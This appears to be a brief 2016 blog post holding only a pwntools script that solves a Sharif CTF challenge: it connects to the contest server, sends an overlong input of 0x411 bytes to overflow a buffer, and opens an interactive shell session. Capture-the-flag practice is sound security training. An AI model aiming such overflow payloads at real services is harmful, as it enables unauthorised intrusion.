---
layout: post
title: "sharif-pwn"
date: 2016-02-06 21:40:50 +0800
comments: true
categories: 
---
'''python
from pwn import *
r = remote('ctf.sharif.edu', 27515)
#r = remote('192.168.56.203', 27515)
print r.recvuntil('enter:')
r.sendline('\x01'*(0x411))
r.interactive()
'''
